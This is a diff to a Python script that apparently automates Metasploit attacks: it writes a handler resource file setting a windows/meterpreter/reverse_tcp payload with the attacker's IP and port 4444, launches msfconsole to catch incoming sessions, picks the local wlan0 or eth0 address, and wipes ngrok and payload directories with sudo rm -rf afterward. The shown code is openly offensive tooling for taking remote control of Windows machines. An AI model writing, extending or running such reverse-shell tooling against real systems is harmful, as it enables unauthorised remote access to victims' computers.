@@ -110,8 +110,8 @@ def venom_window(ip, port, filename):
 def msfconsole():
     print(GREEN + " Starting msfconsole..")
     try:
-        os.system("sudo xterm -T Metasploit -e msfconsole -q -r systemHandler.r")
-        os.system("sudo rm systemHandler.r && sudo rm -rf /root/.ngrok2/ && sudo rm -rf /tmp/payload/")
+        os.system("sudo xterm -T Metasploit -e msfconsole -q -r /root/.androwind/systemHandler.r")
+        os.system("sudo rm /root/.androwind/systemHandler.r && sudo rm -rf /root/.ngrok2/ && sudo rm -rf /tmp/payload/")
         print("Done. Good Bye!")
     except Exception as ex:
         print("Exception: %s " %str(ex))
@@ -119,7 +119,7 @@ def msfconsole():
 #it create systemHandler.r file for metasploit
 def metaConfig(ip, port):
     try:
-        f = open("systemHandler.r", "w+")
+        f = open("/root/.androwind/systemHandler.r", "w+")
         f.write("use exploit/multi/handler\n")
         f.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
         f.write(f"set LHOST {ip}\n")
@@ -182,7 +182,10 @@ def main():
     if choice[0].upper() == 'Y':
 
         try:
-            ip =   ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
+            if ni.ifaddresses('wlan0'):
+                ip = ni.ifaddresses('wlan0')[ni.AF_INET][0]['addr']
+            else:
+                ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
             port = 4444
             __default__(ip,port)
             filename = input("\n" + red_ex + " Enter filename without extension: ")
